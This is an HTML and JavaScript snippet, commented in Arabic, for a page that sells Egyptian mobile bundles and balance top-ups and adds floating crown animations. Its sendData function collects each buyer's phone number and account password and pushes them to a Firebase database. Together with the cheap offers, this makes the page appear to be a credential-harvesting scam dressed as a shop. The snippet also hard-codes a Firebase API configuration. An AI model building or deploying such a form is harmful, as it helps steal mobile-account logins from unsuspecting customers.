<!-- أضف داخل <head> -->
<style>
  .crown {
    position: fixed;
    width: 30px;
    height: 30px;
    background: url('https://cdn-icons-png.flaticon.com/512/616/616408.png') no-repeat center/contain;
    z-index: 0;
    animation: float 5s linear infinite;
    opacity: 0.8;
  }

  @keyframes float {
    0% {
      transform: translateY(0);
      opacity: 1;
    }
    100% {
      transform: translateY(-100vh);
      opacity: 0;
    }
  }
</style>

<!-- داخل <body> قبل </body> -->
<script>
  // تاج عشوائي
  function spawnCrown() {
    const crown = document.createElement("div");
    crown.classList.add("crown");
    crown.style.left = Math.random() * window.innerWidth + "px";
    crown.style.top = Math.random() * window.innerHeight + "px";
    document.body.appendChild(crown);
    setTimeout(() => crown.remove(), 5000);
  }

  setInterval(spawnCrown, 1000);

  // Firebase
  const firebaseConfig = {
    apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
    authDomain: "starkoscript.firebaseapp.com",
    databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
    projectId: "starkoscript",
    storageBucket: "starkoscript.appspot.com",
    messagingSenderId: "381525854892",
    appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  const costDisplay = document.getElementById("costDisplay");
  const egInput = document.getElementById("eg3");
  let finalCost = 0;

  if (egInput) {
    egInput.addEventListener("input", () => {
      const val = parseFloat(egInput.value);
      if (!isNaN(val)) {
        finalCost = val * 1.2;
        costDisplay.textContent = `المبلغ المطلوب: ${finalCost.toFixed(2)} جنيه`;
      } else {
        costDisplay.textContent = "";
        finalCost = 0;
      }
    });
  }

  function sendData(type, numId, passId = '', egId = '') {
    const num = document.getElementById(numId).value.trim();
    const pass = passId ? document.getElementById(passId).value.trim() : "";
    const egRaw = egId ? document.getElementById(egId).value.trim() : "";
    const egg = finalCost.toFixed(2);

    // تحقق من الإدخال حسب نوع الطلب
    if (type === "رصيد صافي") {
      if (!num || !egRaw) {
        alert("يرجى إدخال الرقم والكمية أولاً");
        return;
      }
    } else {
      if (!num || !pass) {
        alert("يرجى إدخال الرقم وكلمة المرور أولاً");
        return;
      }
    }

    let text = "";
    if (type === "فليكس 13000") {
      text = "باقة فليكس 13000 تشمل 13000 فليكس بسعر 240 جنيه، التفعيل خلال ساعتين.";
    } else if (type === "40 جيجا") {
      text = "باقة 40 جيجا إنترنت بسعر 330 جنيه، التفعيل خلال 72 ساعة.";
    } else if (type === "رصيد صافي") {
      text = `شحن رصيد بقيمة ${egg} جنيه (بعد إضافة الضريبة)، سيتم الشحن خلال نصف ساعة.`;
    }

    db.ref("starko").push({
      type,
      num: type === "رصيد صافي" ? "" : num,
      pass,
      eg: type === "رصيد صافي" ? num : "",
      egg: type === "رصيد صافي" ? egg : "",
      text
    }).then(() => {
      showPopup();
    }).catch((err) => {
      alert("حدث خطأ أثناء الإرسال");
      console.error(err);
    });
  }

  function showPopup() {
    const popup = document.getElementById("successPopup");
    popup.style.display = "block";
    setTimeout(() => {
      popup.style.display = "none";
    }, 3000);
  }
</script>
